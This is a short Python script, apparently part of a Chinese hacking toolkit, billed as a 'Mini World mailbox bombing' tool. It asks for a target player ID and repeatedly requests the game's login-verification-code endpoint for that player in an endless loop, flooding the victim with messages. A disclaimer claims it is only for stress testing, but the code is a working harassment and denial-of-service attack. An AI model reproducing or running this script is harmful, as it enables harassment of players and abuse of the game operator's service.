# -*- coding:utf-8 -*-
import datetime
import time
import requests
import re
import os
import threading
import queue
import os
# 导入urlopen
from urllib.request import urlopen
# 导入BeautifulSoup
from bs4 import BeautifulSoup as bf
# 导入urlretrieve函数，用于下载图片
from urllib.request import urlretrieve
# 获得当前时间
now = datetime.datetime.now()
other_StyleTime = now.strftime("%Y-%m-%d %H:%M:%S")
Note=open("use/Reptile.txt",mode='a')
Note.write('\n时间:['+other_StyleTime)
Note.write(']---root用户使用了迷你世界邮箱信息轰炸\n')
Note.close()
print ("\033[1;33;40m ")
print("____            _   _ _            _ _____ _  __")
print("|  _ \ ___ _ __ | |_(_) | ___      | |_   _| |/ /")
print("| |_) / _ \ '_ \| __| | |/ _ \  _  | | | | | ' /")
print("|  _ <  __/ |_) | |_| | |  __/ | |_| | | | | . \ ")
print("|_| \_\___| .__/ \__|_|_|\___|  \___/  |_| |_|\_\ ")
print("           |_|                                   ")
print("迷你世界邮箱信息轰炸")
print("仅用于测压！请勿用于违法，该工具仅针对于游戏迷你世界")
xx = input('目标迷你号: ')
print("开始轰炸，请保持网络流畅，效果更好")
i=0
while i<1000000000000000000:
      jtk = requests.get('https://kfz.mini1.cn/center/?act=login_code&uin=%s&language=0&from=2'%(xx))
      print(jtk.text)
i+=0
